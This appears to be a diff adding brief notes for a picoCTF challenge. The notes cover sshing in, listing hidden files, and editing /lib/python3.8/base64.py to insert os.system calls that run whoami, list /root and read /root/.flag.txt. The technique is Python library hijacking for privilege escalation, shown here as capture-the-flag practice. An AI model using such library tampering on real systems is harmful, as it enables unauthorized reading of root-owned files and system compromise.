@@ -1,0 +1,11 @@
+ssh into the challenge
+cd /home
+ls -al to find hidden files
+also make changes to /lib/python3.8/base64.py
+
+import os
+print('Hello World!')
+os.system('whoami')
+os.system('ls -al /root > /home/picoctf/r.txt')
+os.system('cat /root/.flag.txt')
+
